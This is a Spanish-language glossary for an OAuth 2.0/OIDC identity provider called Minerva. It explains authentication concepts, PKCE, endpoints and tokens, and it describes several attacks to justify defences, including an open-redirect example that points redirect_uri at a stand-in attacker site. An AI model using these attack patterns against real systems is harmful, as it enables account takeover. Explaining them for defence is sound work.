# Glosario OAuth 2.0 / OIDC / Seguridad

Todos los términos que aparecen en este repositorio y en su documentación, explicados desde
cero. **No asume conocimiento previo de autenticación ni de seguridad.**

Cada entrada sigue el mismo formato: **qué es**, **para qué sirve** y un **ejemplo** concreto.

Se puede leer de corrido (las secciones van de lo general a lo específico) o usarse como
referencia puntual. Si un término aparece en negrita dentro de una definición, tiene su propia
entrada en algún lado del documento.

**Índice**

1. [Los dos conceptos que se confunden siempre](#1-los-dos-conceptos-que-se-confunden-siempre)
2. [Los actores](#2-los-actores)
3. [Los protocolos](#3-los-protocolos)
4. [Criptografía mínima](#4-criptografía-mínima)
5. [El flujo Authorization Code](#5-el-flujo-authorization-code)
6. [Parámetros del flujo](#6-parámetros-del-flujo)
7. [PKCE](#7-pkce)
8. [Los endpoints](#8-los-endpoints)
9. [Tokens](#9-tokens)
10. [Claims](#10-claims)
11. [Firma y llaves](#11-firma-y-llaves)
12. [Sesiones](#12-sesiones)
13. [Ataques y defensas](#13-ataques-y-defensas)
14. [Autorización fina en Minerva](#14-autorización-fina-en-minerva)
15. [Errores frecuentes](#15-errores-frecuentes)

---

## 1. Los dos conceptos que se confunden siempre

### Autenticación (authn)

**Qué es.** Probar **quién eres**.

**Para qué sirve.** Es el primer paso de todo: antes de decidir qué puede hacer alguien, hay
que saber quién es.

**Ejemplo.** Escribes tu correo y contraseña en Minerva. Minerva confirma que eres
`ana.perez@jalisco.gob.mx`. Eso es todo lo que hizo — todavía no sabe si puedes crear oficios.

### Autorización (authz)

**Qué es.** Decidir **qué puedes hacer**, una vez que ya se sabe quién eres.

**Para qué sirve.** Separa la identidad del permiso. Dos personas autenticadas correctamente
pueden tener capacidades completamente distintas.

**Ejemplo.** Ana y Luis inician sesión igual de bien. Ana puede aprobar oficios, Luis solo
verlos. Misma autenticación, distinta autorización.

> Regla mnemotécnica: **authn = quién eres. authz = qué puedes hacer.** Se abrevian así porque
> ambas empiezan igual y se prestan a confusión al escribirlas.

### Identidad

**Qué es.** El conjunto de datos que describen a un usuario: su identificador único, correo,
nombre, estado de la cuenta.

**Para qué sirve.** Es lo que un sistema consumidor necesita para saludar al usuario por su
nombre y para asociarle sus registros.

**Ejemplo.** `{ sub: "a3f9-...", email: "ana.perez@jalisco.gob.mx", name: "Ana Pérez" }`.

### SSO (Single Sign-On / Inicio de Sesión Único)

**Qué es.** Iniciar sesión **una vez** y acceder a varios sistemas sin volver a escribir la
contraseña.

**Para qué sirve.** Evita que cada sistema del instituto tenga su propia tabla de usuarios y
su propia pantalla de login — que es como se acumulan contraseñas repetidas y cuentas de
gente que ya no trabaja ahí.

**Ejemplo.** Ana entra a Minerva en la mañana. Al abrir Portal Demo a mediodía, el portal la redirige a
Minerva, Minerva ve que ya tiene sesión y la devuelve autenticada sin pedirle nada. Ana solo
ve un parpadeo del navegador.

### Federación de identidad

**Qué es.** El acuerdo por el cual un sistema **confía** en la palabra de otro sobre quién es
un usuario, en lugar de verificarlo por su cuenta.

**Para qué sirve.** Es lo que hace posible el SSO. Portal Demo no verifica la contraseña de Ana:
confía en que Minerva ya lo hizo, porque el token viene firmado.

**Ejemplo.** Cuando entras a un sitio con "Continuar con Google", ese sitio está federando su
identidad con Google. Aquí, los sistemas del IIEG la federan con Minerva.

---

## 2. Los actores

Los nombres formales vienen de los RFC. Se usan mucho en documentación, conviene reconocerlos.

### IdP (Identity Provider / Proveedor de Identidad)

**Qué es.** El sistema que autentica usuarios y emite tokens sobre su identidad y permisos.

**Para qué sirve.** Centraliza el login de toda una organización en un solo lugar auditable.

**Ejemplo.** **Minerva es el IdP del IIEG.** Google y Microsoft Entra son IdP comerciales.

### Authorization Server (Servidor de Autorización)

**Qué es.** El nombre que el RFC de OAuth le da al componente que emite tokens.

**Para qué sirve.** Distinguirlo del servidor que *consume* los tokens.

**Ejemplo.** En Minerva, IdP y Authorization Server son el mismo servicio. En sistemas grandes
pueden estar separados.

### Cliente (Client) / Relying Party (RP)

**Qué es.** La aplicación que delega su login en el IdP. "Relying Party" = "parte que confía",
porque confía en lo que el IdP afirma.

**Para qué sirve.** Es el rol que tendrá cualquier sistema del instituto que se integre.

**Ejemplo.** Portal Demo. En Minerva cada cliente es un registro en la tabla `applications`,
identificado por un `client_id`.

### Resource Owner (Dueño del Recurso)

**Qué es.** El usuario final. Se llama así porque *él* es el dueño de sus datos y quien
autoriza que una aplicación los use.

**Para qué sirve.** El nombre recuerda que el usuario no es un objeto pasivo del flujo: es
quien concede el acceso.

**Ejemplo.** Ana Pérez, que autoriza a Portal Demo a ver su nombre y correo.

### Resource Server (Servidor de Recursos)

**Qué es.** La API que recibe el token y decide si atiende la petición.

**Para qué sirve.** Es el que hace cumplir la autorización en el punto de uso.

**Ejemplo.** La API de Portal Demo que expone `POST /documents` y valida
`require_permission("portal_demo.documents.create")`.

### User Agent

**Qué es.** El navegador (o la app móvil) del usuario.

**Para qué sirve.** Importa nombrarlo porque **es el único canal inseguro del flujo**: todo lo
que pasa por ahí puede filtrarse. Buena parte del diseño de OAuth existe para minimizar qué
información lo atraviesa.

**Ejemplo.** Chrome, Firefox, la WebView de una app móvil.

### Cliente confidencial vs. cliente público

**Qué es.** La distinción entre clientes que **pueden guardar un secreto** y los que no.

| | ¿Puede guardar un secreto? | Ejemplos |
|---|---|---|
| **Confidencial** | Sí | Un backend, un servicio, un cron |
| **Público** | No | Una SPA, una app móvil, un CLI de escritorio |

**Para qué sirve.** Determina cómo el cliente prueba su identidad ante el IdP. El confidencial
usa un `client_secret`; el público usa **PKCE**.

**Ejemplo.** El backend de Portal Demo en un servidor es confidencial: su `client_secret` vive en
una variable de entorno que nadie ve. Una SPA de React es pública: cualquier cosa que le
pongas está en el JavaScript que el navegador descargó, visible con F12.

---

## 3. Los protocolos

### OAuth 2.0

**Qué es.** Un protocolo de **autorización**: define cómo una aplicación obtiene un token para
actuar en nombre de un usuario, **sin que la aplicación vea la contraseña**.

**Para qué sirve.** Elimina el peor patrón posible: que cada sistema pida y almacene la
contraseña del usuario.

**Ejemplo.** Portal Demo nunca conoce la contraseña de Ana. Recibe un token que dice "el portador
actúa por Ana, con estos permisos, hasta las 14:35".

**Ojo.** OAuth por sí solo **no** estandariza quién es el usuario. Solo dice qué puede hacer
el portador del token. Eso lo agrega OIDC.

### OIDC (OpenID Connect)

**Qué es.** Una capa de **autenticación** construida encima de OAuth 2.0.

**Para qué sirve.** Agrega lo que a OAuth le falta: una forma estándar de saber quién es el
usuario, vía el `id_token` y el endpoint `/userinfo`.

**Ejemplo.** Minerva implementa el flujo OIDC **Authorization Code + PKCE**.

> **OAuth = permisos. OIDC = identidad.** OIDC no reemplaza a OAuth, lo extiende. Todo flujo
> OIDC es también un flujo OAuth.

### RFC (Request For Comments)

**Qué es.** Los documentos donde se especifican formalmente los estándares de internet,
numerados.

**Para qué sirve.** Cuando la documentación dice "RFC 7636", está citando la definición
autoritativa, no una opinión. Son la fuente de verdad cuando dos implementaciones no coinciden.

**Ejemplo.** Los relevantes aquí: **RFC 6749** (OAuth 2.0), **RFC 7636** (PKCE), **RFC 7517**
(JWKS), **RFC 7519** (JWT), **RFC 7009** (revocación).

### Grant Type / Flow (Tipo de concesión / Flujo)

**Qué es.** La "receta" que sigue un cliente para obtener un token. OAuth define varias.

**Para qué sirve.** Cada una sirve a un escenario distinto; elegir mal es un problema de
seguridad, no de estilo.

**Ejemplo.**
- `authorization_code` — el flujo con usuario delante. **El que usa Minerva.**
- `refresh_token` — renovar sin usuario delante.
- `client_credentials` — máquina a máquina, sin usuario (un cron llamando una API).
- `implicit` y `password` — **obsoletos**, no los uses (ver más abajo).

### Implicit Flow (obsoleto)

**Qué es.** Un flujo antiguo donde el token se entregaba directo en la URL de retorno, sin
paso intermedio.

**Para qué sirve.** Para nada hoy. Se documenta solo para que lo reconozcas en tutoriales
viejos y **no lo copies**.

**Ejemplo del problema.** El token llegaba como
`https://app.com/callback#access_token=eyJhbG...` — o sea, el token completo quedaba en el
historial del navegador, en los logs del proxy y en el header `Referer`. Por eso se reemplazó
por Authorization Code + PKCE.

### Resource Owner Password Credentials (obsoleto)

**Qué es.** Un flujo donde la aplicación pedía usuario y contraseña directamente y los enviaba
al IdP.

**Para qué sirve.** Para nada. Destruye el propósito de OAuth: la app vuelve a ver la
contraseña.

**Ejemplo del problema.** Si Portal Demo pide la contraseña de Minerva en su propio formulario,
(a) el portal podría guardarla, (b) entrena a los usuarios a escribir su contraseña institucional
en cualquier formulario que se la pida — que es exactamente el reflejo que explota el
*phishing*.

---

## 4. Criptografía mínima

Lo justo para entender el resto del documento. No hace falta saber matemáticas.

### Hash

**Qué es.** Una función que convierte cualquier entrada en una cadena de tamaño fijo, de forma
**irreversible**: del resultado no se puede volver a la entrada.

**Para qué sirve.** Guardar o comparar algo sin conservar el original.

**Ejemplo.** `SHA256("hola")` siempre da
`b221d9db...`. Pero teniendo `b221d9db...` no hay forma de recuperar `"hola"` salvo probando
todas las entradas posibles.

**Dos propiedades que importan:** la misma entrada siempre da la misma salida (determinista), y
cambiar un solo carácter cambia la salida por completo.

### SHA-256

**Qué es.** El algoritmo de hash concreto que se usa aquí. Produce 256 bits.

**Para qué sirve.** Es el estándar actual para estos usos. Aparece en PKCE (`S256`), en el
hasheo del `sid` y en la firma RS256.

**Ejemplo.** El `code_challenge` de PKCE es `BASE64URL(SHA256(code_verifier))`.

### Base64URL

**Qué es.** Una forma de representar datos binarios usando solo caracteres seguros para una
URL (sin `+`, `/` ni `=`).

**Para qué sirve.** Los tokens y hashes son binarios, pero viajan en URLs y headers HTTP.
Base64URL los vuelve texto transportable.

**Ejemplo.** Las tres partes de un JWT están en Base64URL. **No es cifrado** — se decodifica
con una línea de código, cualquiera puede leer el contenido de un JWT.

### Cifrado simétrico

**Qué es.** Una sola llave que sirve para cifrar **y** descifrar.

**Para qué sirve.** Proteger datos en reposo, cuando el mismo sistema guarda y lee.

**Ejemplo.** Minerva cifra las llaves privadas RSA antes de guardarlas en la base de datos,
usando **Fernet** (cifrado simétrico). Si alguien roba un respaldo de la BD, no obtiene llaves
utilizables.

### Cifrado asimétrico (llave pública / llave privada)

**Qué es.** Un par de llaves matemáticamente relacionadas, donde lo que hace una **solo** lo
deshace la otra.

**Para qué sirve.** Permite **verificar sin poder falsificar** — la propiedad que hace posible
todo el modelo de Minerva.

**Ejemplo.** Minerva firma con la privada (que nunca sale de Minerva). Portal Demo verifica con la
pública (que Minerva publica abiertamente). El portal confirma que el token es auténtico, pero no
puede fabricar uno.

### Firma digital

**Qué es.** Un valor calculado sobre un contenido con una llave privada, que prueba dos cosas:
**quién** lo emitió y que **no fue alterado** desde entonces.

**Para qué sirve.** Es lo que hace que un JWT sea confiable pese a viajar por el navegador del
usuario.

**Ejemplo.** Si alguien edita el payload de su token para cambiar `"is_admin": false` a
`true`, la firma deja de coincidir y el token se rechaza. No puede recalcular la firma porque
no tiene la llave privada.

> **La firma no cifra.** El contenido del JWT sigue siendo legible por cualquiera. La firma
> garantiza integridad y origen, **no** confidencialidad. Nunca pongas datos sensibles en un
> JWT.

### RS256

**Qué es.** El algoritmo de firma de Minerva: RSA (asimétrico) + SHA-256.

**Para qué sirve.** Permite que cualquier sistema verifique tokens sin poseer ningún secreto.

**Ejemplo.** Es el único algoritmo que Minerva usa. Aparece como `"alg": "RS256"` en el header
de todos sus JWT.

### HS256 (y por qué Minerva no lo usa)

**Qué es.** Firma **simétrica**: una sola llave compartida que sirve para firmar y verificar.

**Para qué sirve.** Sistemas monolíticos donde el mismo servicio emite y valida.

**Ejemplo del problema.** Con HS256, Portal Demo necesitaría la llave para verificar — y con esa
misma llave podría **emitir** tokens válidos a nombre de cualquier usuario. Se acabó la
separación entre IdP y consumidor. Por eso Minerva usa RS256 exclusivamente.

### Entropía / Aleatoriedad criptográfica

**Qué es.** Qué tan impredecible es un valor generado al azar. Se mide en bits.

**Para qué sirve.** Un valor aleatorio predecible es tan malo como no tenerlo. `random()` de
un lenguaje común es predecible; hay generadores específicos para criptografía (CSPRNG).

**Ejemplo.** El `sid` de sesión de Minerva son 256 bits de un generador criptográfico. Con esa
entropía, adivinarlo por fuerza bruta no es viable ni con todo el cómputo del planeta.

### Comparación en tiempo constante

**Qué es.** Comparar dos secretos de forma que la operación **tarde lo mismo** coincidan o no.

**Para qué sirve.** Una comparación normal (`==`) sale en cuanto encuentra una diferencia. Un
atacante que mida ese tiempo puede deducir el secreto carácter por carácter — se llama *timing
attack*.

**Ejemplo.** La validación del token CSRF en Minerva usa comparación en tiempo constante, no
`==`.

### Cifrado en reposo (at rest)

**Qué es.** Cifrar los datos tal como se guardan en disco, no solo en tránsito.

**Para qué sirve.** Protege ante robo de respaldos o acceso directo a la base de datos.

**Ejemplo.** `signing_keys.private_key_pem` se guarda cifrado con Fernet.

### TLS / HTTPS

**Qué es.** El cifrado del canal de red. La `S` de HTTPS.

**Para qué sirve.** **Todo OAuth asume TLS.** Sin él, cualquiera en la red lee los tokens al
vuelo y el resto de las protecciones sobran.

**Ejemplo.** En producción, un terminador TLS externo atiende el HTTPS público y reenvía a
nginx por HTTP dentro de la red privada.

### Clock skew (deriva de reloj)

**Qué es.** La diferencia inevitable entre los relojes de dos servidores.

**Para qué sirve.** Un token con `exp` de las 14:35:00 podría rechazarse en un servidor
adelantado 3 segundos aunque siga vigente. Por eso las implementaciones toleran un margen.

**Ejemplo.** Las ventanas de retiro de llaves en Minerva incluyen margen por skew, para no
invalidar tokens legítimos por un desfase de relojes.

---

## 5. El flujo Authorization Code

El flujo completo, paso a paso. Es el corazón de todo lo demás.

```
   Usuario en Portal Demo hace click en "Entrar con Minerva"
             │
             ▼
   ┌─────────────────────────────────────────────────────┐
   │ 1. Portal Demo redirige el NAVEGADOR a Minerva      │
   │    GET /auth/authorize                              │
   │      ?client_id=portal_demo                         │
   │      &redirect_uri=https://portal-demo.../callback  │
   │      &state=xyz789                                  │
   │      &code_challenge=E9Melhoa...                    │
   │      &scope=openid profile email                    │
   └─────────────────────────────────────────────────────┘
             │
             ▼
   ┌─────────────────────────────────────────────────────┐
   │ 2. Minerva autentica al usuario                     │
   │    (login, o SSO silencioso si ya tenía sesión)     │
   └─────────────────────────────────────────────────────┘
             │
             ▼
   ┌─────────────────────────────────────────────────────┐
   │ 3. Minerva redirige de vuelta con un CODE           │
   │ https://portal-demo.../callback?code=abc123&state=xyz│
   │                                    ↑                 │
   │              esto SÍ pasa por el navegador           │
   └─────────────────────────────────────────────────────┘
             │
             ▼
   ┌─────────────────────────────────────────────────────┐
   │ 4. El BACKEND de Portal Demo canjea el code         │
   │    POST /auth/token                                 │
   │      code=abc123                                    │
   │      code_verifier=dBjftJeZ...                      │
   │                                                     │
   │    ←── servidor a servidor, NO pasa por el navegador │
   └─────────────────────────────────────────────────────┘
             │
             ▼
   ┌─────────────────────────────────────────────────────┐
   │ 5. Minerva responde con los tokens                  │
   │    { access_token, id_token, refresh_token }        │
   └─────────────────────────────────────────────────────┘
```

### Authorization Code (el flujo)

**Qué es.** El flujo donde el cliente **nunca** recibe el token por el navegador: recibe un
código intermedio de un solo uso, que canjea después servidor a servidor.

**Para qué sirve.** Mantener el token fuera del canal inseguro.

**Ejemplo.** Es el flujo recomendado para cualquier aplicación hoy, y el único que Minerva
implementa.

### La pregunta obvia: ¿por qué no dar el token directo?

Porque el paso 3 **va por el navegador**, y todo lo que pasa por ahí se filtra:

- Queda en el **historial** del navegador
- Queda en los **logs** de cualquier proxy intermedio
- Se envía en el header **`Referer`** si la página carga un recurso externo
- Lo pueden leer **extensiones** del navegador

Por eso lo que viaja por ahí es un `code`, que por sí solo **no sirve de nada**: es de un solo
uso, vive segundos, y para canjearlo hace falta el `client_secret` o el `code_verifier` — que
nunca pasaron por el navegador. El token real viaja en el paso 4, invisible.

### Canal frontal vs. canal trasero (front-channel / back-channel)

**Qué es.** Los dos caminos por los que fluye información.
- **Front-channel**: a través del navegador, vía redirects. **Inseguro.**
- **Back-channel**: HTTP directo de servidor a servidor. **Seguro.**

**Para qué sirve.** Es el criterio de diseño de todo OAuth: minimizar qué viaja por el front-channel.

**Ejemplo.** El `code` va por el front-channel (paso 3). Los tokens van por el back-channel
(paso 5). Por eso el flujo tiene dos etapas en vez de una.

### Callback

**Qué es.** El endpoint del cliente que recibe el redirect de vuelta con el `code`.

**Para qué sirve.** Es donde el cliente retoma el control después de que el IdP hizo su parte.

**Ejemplo.** `https://portal-demo.jalisco.gob.mx/callback`. Ahí el portal verifica el `state`, canjea el
`code` y crea su propia sesión.

---

## 6. Parámetros del flujo

### `client_id`

**Qué es.** El identificador público de una aplicación registrada.

**Para qué sirve.** Le dice al IdP quién está pidiendo. No es secreto: viaja en la URL.

**Ejemplo.** `client_id=portal_demo`.

### `client_secret`

**Qué es.** La contraseña de la **aplicación** (no del usuario), para clientes confidenciales.

**Para qué sirve.** Prueba, al canjear el `code`, que quien lo canjea es realmente esa
aplicación.

**Ejemplo.** Vive en una variable de entorno del backend de Portal Demo. Minerva lo guarda hasheado
(`client_secret_hash`), nunca en claro — igual que una contraseña de usuario.

### `redirect_uri`

**Qué es.** La URL exacta a la que el IdP redirige tras autenticar, con el `code` en el query
string.

**Para qué sirve.** Debe estar **registrada previamente** y coincidir exactamente. Es la
defensa contra que alguien desvíe el `code` a un destino propio.

**Ejemplo del ataque que previene.** Sin validación, un atacante manda a la víctima un enlace
con `redirect_uri=https://sitio-del-atacante.com`. La víctima se autentica de verdad en
Minerva, y Minerva le entrega el `code`... al atacante. Se llama **open redirect**.

### `state`

**Qué es.** Un valor aleatorio que el cliente genera antes de redirigir, y que el IdP devuelve
sin modificar.

**Para qué sirve.** Protege contra **CSRF en el flujo de login**: al volver, el cliente
verifica que el `state` recibido sea el que él generó y guardó en la sesión.

**Ejemplo del ataque que previene.** Un atacante inicia un login con *su* cuenta, intercepta
su propio `code`, y te hace visitar `https://portal-demo.../callback?code=<code-del-atacante>`. Sin
`state`, el portal canjearía ese code y te dejaría **dentro de la sesión del atacante** — donde
todo lo que subas queda en la cuenta de él. Con `state`, el portal ve un valor que no generó y
aborta.

### `nonce`

**Qué es.** "Number used once". Un valor aleatorio de un solo uso que el cliente manda en
`/authorize` y que reaparece **dentro del `id_token`**.

**Para qué sirve.** Protege contra **replay del `id_token`**: garantiza que el token que
recibes fue emitido para *esta* petición y no es uno viejo reinyectado.

**Ejemplo.** Portal Demo genera `nonce=n-0S6_WzA2Mj`, lo manda, y al recibir el `id_token` verifica
que el claim `nonce` coincida. Si no, descarta el token.

**Diferencia con `state`.** `state` se verifica en la URL de retorno y protege el flujo.
`nonce` se verifica dentro del token y protege el token. Se usan los dos, no son alternativos.

### `scope`

**Qué es.** La lista de permisos de **identidad** que el cliente solicita.

**Para qué sirve.** Determina qué claims aparecen en el `id_token` y qué devuelve
`/userinfo`. Aplica el principio de mínimo privilegio: pide solo lo que necesitas.

**Ejemplo.** `scope=openid profile email`.
- `openid` — **obligatorio**, es lo que convierte una petición OAuth en una petición OIDC.
- `profile` — nombre, apellidos.
- `email` — correo.

> ⚠️ **Confusión muy común.** El `scope` **no** son los permisos de negocio. `scope=profile` no
> tiene nada que ver con `portal_demo.documents.create`. El scope es de identidad, los permisos finos
> se resuelven aparte (ver sección 14).

### `response_type`

**Qué es.** Qué espera recibir el cliente de `/authorize`.

**Para qué sirve.** Selecciona el flujo.

**Ejemplo.** `response_type=code` — el único valor correcto hoy. Valores como `token` o
`id_token` corresponden al obsoleto implicit flow.

### `grant_type`

**Qué es.** El equivalente de `response_type` pero en `/token`: qué está canjeando el cliente.

**Para qué sirve.** Le dice al endpoint cómo procesar la petición.

**Ejemplo.** `grant_type=authorization_code` al canjear el code;
`grant_type=refresh_token` al renovar.

### `prompt`

**Qué es.** Un parámetro con el que el cliente le pide al IdP un comportamiento específico de
interacción.

**Para qué sirve.** Permite exigir credenciales frescas o mostrar el selector de cuentas para
operaciones sensibles.

**Ejemplo.**
- *(sin `prompt`)* — SSO silencioso: si hay sesión, pasa directo.
- `prompt=login` — pide credenciales aunque ya haya sesión.
- `prompt=select_account` — muestra el selector de cuentas.
- `prompt=none` — no muestres nada; si no hay sesión, devuelve error en vez de un login.

### `max_age`

**Qué es.** La antigüedad máxima aceptable, en segundos, de la autenticación del usuario.

**Para qué sirve.** Para operaciones sensibles: "me sirve su sesión, pero solo si se autenticó
hace poco".

**Ejemplo.** `max_age=300` → "si Ana se autenticó hace más de 5 minutos, pídele credenciales
otra vez antes de dejarla autorizar este pago".

### `login_hint`

**Qué es.** Una sugerencia del cliente sobre qué cuenta usar.

**Para qué sirve.** Comodidad: prellenar el campo de correo.

**Ejemplo.** `login_hint=ana.perez@jalisco.gob.mx` hace que el formulario de login aparezca
con el correo ya escrito.

---

## 7. PKCE

Se pronuncia **"pixy"**. Definido en el RFC 7636.

### PKCE (Proof Key for Code Exchange)

**Qué es.** Un mecanismo que liga el `/authorize` inicial con el `/token` final **sin
necesitar `client_secret`**.

**Para qué sirve.** Resuelve el problema del cliente público: ¿cómo pruebo que soy el mismo
que inició el flujo, si no puedo guardar ningún secreto?

**Ejemplo del ataque que previene.** En móviles, varias apps pueden registrar el mismo esquema
de redirect (`portal-demo://callback`). Una app maliciosa instalada en el teléfono podría interceptar
el `code`. Con PKCE, ese `code` no le sirve: no tiene el `code_verifier`.

### Cómo funciona

```
1. El cliente inventa un secreto NUEVO en cada login:
   code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
                    (43-128 caracteres aleatorios)

2. Calcula su hash:
   code_challenge = BASE64URL(SHA256(code_verifier))
                  = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

3. En /authorize manda SOLO el hash.
   → Minerva lo guarda junto al code.
   → El verifier nunca salió del cliente. Nunca tocó el navegador.

4. En /token manda el verifier original.
   → Minerva calcula SHA256(verifier) y lo compara con lo que guardó.
   → ¿Coinciden? Es el mismo cliente. Entrega los tokens.
```

La clave está en que el hash es **irreversible**: quien intercepte el `code_challenge` en la
URL no puede deducir el `code_verifier`.

### `code_verifier`

**Qué es.** La cadena aleatoria de alta entropía que el cliente genera y **guarda para sí**.

**Para qué sirve.** Es la prueba de posesión que se revela solo al final, por el canal seguro.

**Ejemplo.** Se genera nuevo en cada intento de login. Nunca se reutiliza, nunca aparece en una
URL.

### `code_challenge`

**Qué es.** El hash del `code_verifier`. La versión que **sí** viaja por el navegador.

**Para qué sirve.** Permite que el IdP verifique después, sin haber conocido el secreto antes.

**Ejemplo.** Es lo único de PKCE que aparece en la URL de `/authorize`.

### `code_challenge_method`

**Qué es.** Cómo se derivó el challenge del verifier.

**Para qué sirve.** Solo hay dos valores, y uno es inseguro.

**Ejemplo.**
- `S256` — con SHA-256. **El único que Minerva acepta.**
- `plain` — el challenge *es* el verifier, sin hashear. Anula la protección por completo: quien
  intercepta la URL ya tiene el secreto. Minerva lo **rechaza explícitamente** para que nadie
  pueda forzar un *downgrade* a la versión débil.

### Cuándo es obligatorio

**Qué es.** La regla de aplicación en Minerva.

**Para qué sirve.** PKCE es indispensable para clientes públicos y recomendable para todos.

**Ejemplo.** Si una aplicación está registrada sin `client_secret` (cliente público),
`/authorize` **exige** `code_challenge` y devuelve error sin él. Para clientes confidenciales
es opcional, pero conviene usarlo igual: defensa en profundidad.

---

## 8. Los endpoints

### `/authorize` — Authorization Endpoint

**Qué es.** `GET /auth/authorize`. Donde llega el **navegador** del usuario.

**Para qué sirve.** Autenticar al usuario y emitir el `code`.

**Ejemplo.** Si hay sesión, genera el `code` y redirige de vuelta. Si no, muestra el login y
retoma el flujo después (parámetro `next=`).

### `/token` — Token Endpoint

**Qué es.** `POST /auth/token`. Llamada **servidor a servidor**, nunca desde el navegador.

**Para qué sirve.** Canjear el `code` (+ `code_verifier`) por los tokens, y renovar con el
refresh token.

**Ejemplo.** El backend de Portal Demo lo llama con `grant_type=authorization_code` y recibe
`{ access_token, id_token, refresh_token }`.

### `/revoke` — Revocation Endpoint (RFC 7009)

**Qué es.** `POST /auth/revoke`. Invalida un token antes de su expiración natural.

**Para qué sirve.** Cerrar sesión de verdad, o cortar el acceso ante un robo detectado.

**Ejemplo.** Al revocar un refresh token, Minerva invalida también **toda su familia** y
blacklistea los access tokens ya emitidos a partir de él.

### `/userinfo` — UserInfo Endpoint

**Qué es.** Endpoint OIDC que devuelve los claims de identidad del usuario del token
presentado como Bearer.

**Para qué sirve.** Obtener datos de identidad frescos sin re-autenticar, y filtrados por el
scope con el que se emitió el token.

**Ejemplo.** Portal Demo llama `/userinfo` con el access token y recibe `{ sub, email, name }` —
solo los campos que el scope autorizó.

### Discovery — `/.well-known/openid-configuration`

**Qué es.** Un JSON estándar que describe toda la configuración del IdP: endpoints, algoritmos
soportados, scopes disponibles.

**Para qué sirve.** Que una librería cliente **se autoconfigure sola**. Es el punto de partida
de cualquier integración: le das la URL del IdP y descubre el resto.

**Ejemplo.**
```json
{
  "issuer": "https://minerva.jalisco.gob.mx",
  "authorization_endpoint": ".../auth/authorize",
  "token_endpoint": ".../auth/token",
  "jwks_uri": ".../.well-known/jwks.json",
  "userinfo_endpoint": ".../userinfo",
  "id_token_signing_alg_values_supported": ["RS256"]
}
```

### `/.well-known/`

**Qué es.** Una ruta estandarizada (RFC 8615) donde los servicios publican metadatos en
ubicaciones predecibles.

**Para qué sirve.** Que un cliente encuentre la configuración sin que nadie se la diga.

**Ejemplo.** Por convención, cualquier IdP OIDC del mundo expone su discovery en
`/.well-known/openid-configuration`.

---

## 9. Tokens

### JWT (JSON Web Token) — RFC 7519

**Qué es.** El formato de token que se usa aquí. Tres partes en Base64URL separadas por puntos:

```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImEzZjkifQ  .  eyJzdWIiOiJhbmEiLCJleHAiOjE3MzB9  .  RmxT8kQ...
└────────── HEADER ──────────────────┘     └────────── PAYLOAD ───────────┘     └─ FIRMA ─┘
     alg, kid                                    los claims                   verifica todo
```

**Para qué sirve.** Transportar información verificable sin necesidad de consultar una base de
datos en cada request.

**Ejemplo.** Pega un JWT en jwt.io y verás el contenido al instante.

> 🔴 **Lo más importante de entender: un JWT NO está cifrado.** Base64 no es cifrado, es
> codificación. Cualquiera que tenga el token lee todo su contenido. La firma impide
> *modificarlo*, no *leerlo*. **Nunca pongas datos sensibles en un JWT.**

### Header (del JWT)

**Qué es.** La primera parte. Metadatos sobre la firma.

**Para qué sirve.** El verificador lo lee **antes** de validar, para saber qué llave buscar.

**Ejemplo.** `{ "alg": "RS256", "kid": "a3f9c2..." }`.

### Payload (del JWT)

**Qué es.** La segunda parte. Los **claims**, o sea el contenido.

**Para qué sirve.** Lleva la identidad y los permisos.

**Ejemplo.** `{ "sub": "a3f9-...", "email": "ana@...", "exp": 1730000000, "typ": "access" }`.

### Signature (del JWT)

**Qué es.** La tercera parte. La firma sobre `header + payload`.

**Para qué sirve.** Detectar cualquier alteración y probar el origen.

**Ejemplo.** Cambia un solo carácter del payload y la firma deja de validar.

### Bearer Token

**Qué es.** "Token al portador". Se envía en el header `Authorization: Bearer <token>`.

**Para qué sirve.** Es el mecanismo estándar para presentar un token a una API.

**Ejemplo.** `Authorization: Bearer eyJhbGciOiJSUzI1NiI...`

> El nombre advierte el riesgo: **quien lo porte, es el usuario**. No hay prueba adicional de
> identidad. De ahí que sean de vida corta y que TLS sea obligatorio.

### Access Token

**Qué es.** El token de vida corta que se usa para **llamar APIs**.

**Para qué sirve.** Es la credencial de trabajo del día a día.

**Ejemplo.** En Minerva dura 15 minutos (`MINERVA_ACCESS_TOKEN_TTL_MINUTES`) y lleva `sub`,
`email`, `roles`, `permissions`, `scope`, `jti` y `typ=access`.

**Por qué tan corto.** Porque es *bearer*: si se filtra, quieres que el daño dure minutos, no
meses.

### ID Token

**Qué es.** Un JWT con la **identidad** del usuario. Es la aportación específica de OIDC.

**Para qué sirve.** Que el cliente sepa quién entró — para saludarlo por su nombre y crear su
sesión local.

**Ejemplo.** Su `aud` es el `client_id`, y lleva el `nonce` si se envió uno.

> 🔴 **Error clásico:** mandar el `id_token` como Bearer para llamar una API. **No es su
> función.** El `id_token` es una credencial de identidad *para el cliente*; el que llama APIs
> es el `access_token`. Una API bien implementada rechazará un `id_token` porque el `aud` no
> corresponde.

### Refresh Token

**Qué es.** Un token de vida larga cuyo único uso es pedir un access token nuevo.

**Para qué sirve.** Concilia seguridad y comodidad: el access token dura poco, pero el usuario
no tiene que volver a escribir su contraseña cada 15 minutos.

**Ejemplo.** En Minerva dura 30 días (`MINERVA_REFRESH_TOKEN_TTL_DAYS`) y **nunca sale del
backend** del cliente. Jamás debe llegar al navegador.

### Rotación de refresh tokens

**Qué es.** Cada vez que se usa un refresh token, se invalida y se emite uno nuevo (RFC 6749
§10.4).

**Para qué sirve.** Convierte el robo de un refresh token en algo **detectable**.

**Ejemplo.** Si un atacante roba una copia y la usa, aparecerá un refresh token **ya rotado** —
señal inequívoca de que hay dos partes usando la misma credencial.

### Reuse detection / Familia de tokens

**Qué es.** La reacción al detectar un token ya rotado: revocar toda la cadena de tokens
derivados del original.

**Para qué sirve.** Ante un robo no se sabe quién es el legítimo y quién el atacante. Cortar
todo obliga a un login nuevo — molesto para el usuario, letal para el atacante.

**Ejemplo.** Ana refresca (token A → B). Un atacante que robó A lo usa. Minerva ve A ya
rotado, revoca A, B y todo lo derivado. Ambos quedan fuera; Ana entra de nuevo con contraseña,
el atacante no puede.

### Token opaco

**Qué es.** Un token que **no contiene información**: es solo un identificador aleatorio que
apunta a un registro del lado del servidor.

**Para qué sirve.** Es lo contrario del JWT. Se puede revocar al instante (borras el registro),
pero exige consultar el servidor en cada validación.

